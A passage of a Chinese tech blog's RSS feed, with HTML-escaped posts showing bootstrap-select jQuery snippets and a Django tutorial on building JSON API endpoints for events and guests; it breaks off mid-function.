&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.selectpicker&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;selectpicker&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;val&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;trigger&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;change&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;多选的赋值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.selectpicker&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;selectpicker&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;val&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;]).&lt;span style=&#34;color:#a6e22e&#34;&gt;trigger&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;change&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5恢复原状&#34;&gt;5.恢复原状&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#initializePartyAProject&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
      &lt;span style=&#34;color:#75715e&#34;&gt;// 回到初始状态
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#party_a_project_name&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;selectpicker&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;val&amp;#39;&lt;/span&gt;,[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;noneSelectedText&amp;#39;&lt;/span&gt;]) 
      &lt;span style=&#34;color:#75715e&#34;&gt;// 对 party_a_project_name 这个下拉框进行重置刷新
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#party_a_project_name&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;selectpicker&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;refresh&amp;#39;&lt;/span&gt;);
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—接口开发</title>
        <link>https://ac-lm.github.io/posts/django/django%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91/</link>
        <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91/</guid>
        <description>&lt;h2 id=&#34;1在项目文件下-urlspy-添加接口根路径&#34;&gt;1.在项目文件下 urls.py 添加接口根路径:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# api&lt;/span&gt;
path(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;api/&amp;#39;&lt;/span&gt;,include(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django_web.urls&amp;#39;&lt;/span&gt;)),
&lt;span style=&#34;color:#75715e&#34;&gt;# url(r&amp;#39;^api/&amp;#39;,include((&amp;#39;django_web.urls&amp;#39;,&amp;#39;django_web&amp;#39;),namespace=&amp;#39;django_web&amp;#39;)),&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2在-app-应用-django_web-下新建-urlspy-添加具体接口&#34;&gt;2.在 app 应用 django_web 下新建 urls.py 添加具体接口：&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.urls &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; path
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django_web.views &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; views_api

&lt;span style=&#34;color:#75715e&#34;&gt;# 在 django_web 下创建 urls.py，配置具体接口的二级目录&lt;/span&gt;

urlpatterns &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#75715e&#34;&gt;# guest system interface:&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# ex : /api/add_event/&lt;/span&gt;
    path(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add_event/&amp;#39;&lt;/span&gt;,views_api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_event,name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add_event&amp;#39;&lt;/span&gt;),
    &lt;span style=&#34;color:#75715e&#34;&gt;# ex : /api/get_event_list/&lt;/span&gt;
    path(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;get_event_list/&amp;#39;&lt;/span&gt;,views_api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_event_list,name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;get_event_list&amp;#39;&lt;/span&gt;),
    &lt;span style=&#34;color:#75715e&#34;&gt;# ex: /api/add_guest/&lt;/span&gt;
    path(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add_guest/&amp;#39;&lt;/span&gt;,views_api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_guest,name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add_guest&amp;#39;&lt;/span&gt;),
    &lt;span style=&#34;color:#75715e&#34;&gt;# ex: /api/get_guest_list/&lt;/span&gt;
    path(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;get_guest_list/&amp;#39;&lt;/span&gt;,views_api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_guest_list,name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;get_guest_list&amp;#39;&lt;/span&gt;),
    &lt;span style=&#34;color:#75715e&#34;&gt;# ex: /api/user_sign/&lt;/span&gt;
    path(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_sign/&amp;#39;&lt;/span&gt;,views_api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;user_sign,name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_sign&amp;#39;&lt;/span&gt;),
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3在创建接口视图函数-view_apipy-文件实现具体接口&#34;&gt;3.在创建接口视图函数 view_api.py 文件，实现具体接口：&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django_web.models &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Event, Guest
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.http &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; JsonResponse
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.core.exceptions &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ValidationError, ObjectDoesNotExist
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.db.utils &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; IntegrityError
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; json
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.core &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; serializers
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time

&lt;span style=&#34;color:#75715e&#34;&gt;# JsonResponse 默认传入参数是字典格式，如果不是，则报错。&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 添加发布会接口&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_event&lt;/span&gt;(request):
    &lt;span style=&#34;color:#75715e&#34;&gt;# POST请求&lt;/span&gt;
    eid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eid&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    limit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;limit&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;address&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    start_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;start_time&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; eid &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; limit &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; address &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; start_time &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# ensure_ascii 禁用ascii码&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10021&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;参数错误&amp;#39;&lt;/span&gt;}, json_dumps_params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ensure_ascii&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;})
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; result:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10022&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;发布会id已存在&amp;#39;&lt;/span&gt;}, json_dumps_params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ensure_ascii&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;})
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;name)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; result:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10023&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;发布会名称已存在&amp;#39;&lt;/span&gt;}, json_dumps_params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ensure_ascii&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;})
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid, name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;name, limit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;limit, status&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;int(status), address&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;address, start_time&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;start_time)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ValidationError:
        error &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;开始日期格式错误，必须是:YYYY-MM-DD HH:MM:SS&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10024&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: error})
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;添加成功&amp;#39;&lt;/span&gt;})


&lt;span style=&#34;color:#75715e&#34;&gt;# 发布会查询接口&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_event_list&lt;/span&gt;(request):
    &lt;span style=&#34;color:#75715e&#34;&gt;# GET请求&lt;/span&gt;
    eid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eid&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; eid &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10021&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;参数错误&amp;#39;&lt;/span&gt;})
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; eid &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        event &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
        &lt;span style=&#34;color:#75715e&#34;&gt;# 方法一：&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# filter 返回由对象组成的列表，特点：返回对象列表不存在，不报错，[].&lt;/span&gt;

        &lt;span style=&#34;color:#75715e&#34;&gt;# if result.exists():&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     print(&amp;#34;查询的发布会id是:%s&amp;#34;%result[0].id)&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     print(type(result))&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     # 序列化对象，转成类型字符串&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     datas = serializers.serialize(&amp;#39;json&amp;#39;,result)&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     # 字符串转成字典，就没有&amp;#39;\&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     new_datas = json.loads(datas)&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     return JsonResponse({&amp;#39;status&amp;#39;: 10022, &amp;#39;message&amp;#39;:new_datas})&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# else:&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#     return JsonResponse({&amp;#39;status&amp;#39;:10023,&amp;#39;message&amp;#39;:&amp;#39;查询对象结果为空&amp;#39;})&lt;/span&gt;

        &lt;span style=&#34;color:#75715e&#34;&gt;# 方法二：&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ObjectDoesNotExist:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10023&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询对象结果为空&amp;#39;&lt;/span&gt;})
        &lt;span style=&#34;color:#75715e&#34;&gt;# 给字典添加键值对&lt;/span&gt;
        event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name
        event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;limit&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;limit
        event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status
        event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;address&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address
        event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;start_time&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start_time
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询成功&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt;: event})

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        datas &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        &lt;span style=&#34;color:#75715e&#34;&gt;# 模糊查询：name__contains&lt;/span&gt;
        results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(name__contains&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;name)
        print(results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;first())
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; results:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; results:
                event &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
                &lt;span style=&#34;color:#75715e&#34;&gt;# 给字典添加键值对&lt;/span&gt;
                event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name
                event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;limit&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;limit
                event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status
                event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;address&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address
                event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;start_time&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start_time
                datas&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(event)
